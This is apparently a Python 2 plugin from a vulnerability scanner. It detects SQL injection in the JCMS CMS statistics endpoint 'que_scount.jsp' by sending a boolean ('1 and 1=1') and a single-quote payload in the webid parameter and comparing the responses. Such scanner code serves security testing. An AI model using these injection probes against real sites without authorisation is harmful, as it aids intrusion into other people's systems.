#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        detail = u''
        detail = detail.encode('utf8')
        key = u'当前没有统计记录'
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        exp1 = url+'vc/vc/interface/index/que_scount.jsp?webid=1'
        exp2 = url+'vc/vc/interface/index/que_scount.jsp?webid=1%20and%201=1'
        exp3 = url+'vc/vc/interface/index/que_scount.jsp?webid=1%27'
        #res1, content1 = http.request(exp1)
        res1, content1 = yx_httplib2_request(http,exp1)
        if res1['status'] == '200':
            #res2,content2 = http.request(exp2)
            res2,content2 = yx_httplib2_request(http,exp2)
            patten = re.compile(r'(\d{1,9})</span></td>')
            res = re.findall(patten,content2)
            #res3,content3 = http.request(exp3)
            res3,content3 = yx_httplib2_request(http,exp3)
            if res and (content3.find(key.encode('utf8'))>=0 or content3.find(key.encode('gbk'))>=0):           
                request = getRequest(exp3)
                response = getResponse(res3)
                list.append(getRecord(ob,exp3,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:JCMS_Statistic_SqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:JCMS_Statistic_SqlInjectionScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
